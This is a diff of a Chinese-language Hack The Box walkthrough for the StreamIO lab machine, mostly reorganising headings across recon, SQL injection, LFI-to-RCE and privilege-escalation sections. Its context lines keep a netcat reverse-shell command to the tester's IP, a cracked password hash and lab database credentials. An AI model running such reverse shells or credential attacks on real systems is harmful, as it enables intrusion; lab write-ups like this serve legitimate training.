@@ -8,8 +8,10 @@ track: Standalone
 靶机为HTB的域渗透靶机StreamIO
 ![](Pasted_image_20241218204233.png)
 
-# 端口扫描
-### 全端口扫描
+## 信息收集
+
+### 端口扫描
+#### 全端口扫描
 
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
@@ -42,7 +44,7 @@ PORT      STATE SERVICE
 
 ~~~
 
-### 默认脚本扫描
+#### 默认脚本扫描
 
 扫描得到域名watch.streamIO.htb
 
@@ -104,7 +106,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.82 seconds
 
 ~~~
 
-### 漏洞脚本扫描
+#### 漏洞脚本扫描
 
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
@@ -157,7 +159,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1090.12 seconds
 ~~~
 
 ![](Pasted_image_20241218210603.png)
-# 修改hosts文件
+### 修改 Hosts 文件
 ~~~
 ┌──(kali㉿kali)-[~/StreamIO]
 └─$ sudo vim /etc/hosts                                                                                                              
@@ -175,7 +177,7 @@ ff02::2         ip6-allrouters
 ~~~
 
 
-# 子域名枚举
+### 子域名枚举
 
 仅有watch这个子域名
 
@@ -247,7 +249,7 @@ Found: xn--54qq0q0en86ikgxilmjza-biz.streamio.htb Status: 400 [Size: 334]
 Found: xn--qckr4fj9ii2a7e-jp.streamio.htb Status: 400 [Size: 334]
 ~~~
 
-# 139/445(SMB)
+### SMB 信息收集（139/445）
 
 开了SMB服务，先用smbmap查看SMB的信息，发现无果
 
@@ -280,13 +282,13 @@ Password for [WORKGROUP\kali]:
 session setup failed: NT_STATUS_ACCESS_DENIED
 ~~~
 
-# 80(HTTP)
+### Web 信息收集（80）
 http://streamio.htb看起来是IIS的默认页，http://watch.streamio.htb也是相同的默认页
 没什么其他的信息了，暂且搁置
 
 ![](Pasted_image_20241218210704.png)
 
-# 443(HTTPS)
+### Web 信息收集（443）
 ### 访问https://streamio.htb
 是一个流媒体网站的介绍页
 
@@ -605,6 +607,10 @@ Finished
                                                                          
 ~~~
 
+## 漏洞利用
+
+### SQL 注入获取用户凭据
+
 发现存在search.php
 
 ![](Pasted_image_20241219141739.png)
@@ -857,6 +863,8 @@ yoshihide :b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
 
 ![](Pasted_image_20241219155026.png)
 
+### 代码审计与 LFI RCE
+
 对admin目录进行第二次扫描，发现了之前漏扫的master.php
 
 ![](Pasted_image_20241219155449.png)
@@ -1064,6 +1072,10 @@ system("c:\\programdata\\nc64.exe 10.10.16.14 443 -e powershell.exe")
 
 ![](Pasted_image_20241219170527.png)
 
+## 权限提升
+
+### 数据库凭据获取与横向移动
+
 接下来要尝试横向移动
 
 查找一下数据库登陆凭据
@@ -1080,3 +1092,14 @@ $connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB
 ~~~
     $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');                                                                                                                
 ~~~
+
+## 当前进度（WIP）
+
+本文到“数据库凭据提取”阶段结束，后续横向移动、域提权和最终收尾尚未补充。  
+后续可按完整版 `notes/streamIO-HTB-windows-medium/index.md` 的路线继续完善。
+
+## 下一步计划
+
+1. 用提取到的数据库凭据继续枚举可登录用户与可复用口令。  
+2. 补全 WinRM/AD 横向移动步骤及关键命令输出。  
+3. 完整记录最终提权链和 root/administrator 侧验证。  
